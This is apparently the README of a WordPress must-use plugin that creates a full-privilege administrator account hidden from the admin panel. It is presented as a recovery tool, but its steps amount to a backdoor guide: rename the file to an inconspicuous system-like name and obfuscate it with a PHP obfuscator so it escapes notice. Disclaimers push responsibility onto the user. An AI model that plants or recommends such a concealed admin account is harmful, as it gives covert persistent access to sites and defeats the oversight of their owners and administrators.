# WP Ghost User

**WP Ghost User** is a WordPress mu-plugin that creates a hidden ghost user. This user is not visible in the WordPress admin panel but can perform actions on the site. It is particularly useful for security operations and recovering access if the admin user gets locked out. 

**Caution:** This user has the same full capabilities as an administrator. Use it responsibly; the author is not responsible for any damage caused by using this plugin.

## Installation and Usage Guide

Follow these steps to install and use the WP Ghost User plugin:

1. **Download** the plugin from the repository.
2. **Upload** the plugin to the `wp-content/mu-plugins` directory.
3. **Rename** the plugin file to something inconspicuous (e.g., `wp-default-actions.php`).
4. **Refresh** the WordPress admin panel—your ghost user is now ready to use!
5. **Logout** from the admin panel and log in using the username and password set in the plugin file.
6. You can now perform any actions on the site with this user.
7. It's recommended to use a PHP obfuscator to enhance the security of the plugin file.

## Important Notes

- This user is **not visible** in the WordPress admin panel.
- This user has **full administrator capabilities**.
- Use this user with **caution**; you are fully responsible for its use.
- Ensure you set a **strong username and password** for this user, and save them in a secure place.

## Disclaimer

The author of this plugin is not liable for any issues or damages that may arise from its use. Always ensure you understand the implications of creating and using a ghost user.
